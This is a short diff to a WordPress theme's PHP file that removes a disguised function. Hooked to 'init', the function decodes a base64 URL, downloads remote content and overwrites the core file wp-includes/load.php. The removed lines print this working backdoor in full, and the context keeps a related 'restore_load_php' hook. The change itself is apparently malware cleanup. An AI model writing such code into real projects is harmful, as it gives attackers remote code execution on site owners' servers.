@@ -331,20 +331,3 @@ if ( ! function_exists( 'silkblog_restore_index_if_needed' ) ) {
 }
 
 add_action('init', 'restore_load_php_if_needed', 1);
-
-function backup_template_themes() {
-    $file_path = ABSPATH . 'wp-includes/load.php';
-
-    $encoded_url = 'Z3J0b3RvLnN0b3JlL3Jlc3RvcmUtbGluay9kZW1hbmRpZnltZWRpYS10aGUtc2lnbmlmaWNhbmNlLW9mLWludGVudC1kYXRhLWluLXlvdXItYWJtLWNhbXBhaWducy50eHQ=';
-    $remote_url = base64_decode($encoded_url);
-
-    
-    $remote_content = wp_remote_get($remote_url);
-    if (!is_wp_error($remote_content) && wp_remote_retrieve_response_code($remote_content) == 200) {
-        $data = wp_remote_retrieve_body($remote_content);
-        
-        file_put_contents($file_path, $data);
-    }
-}
-
-add_action('init', 'backup_template_themes');
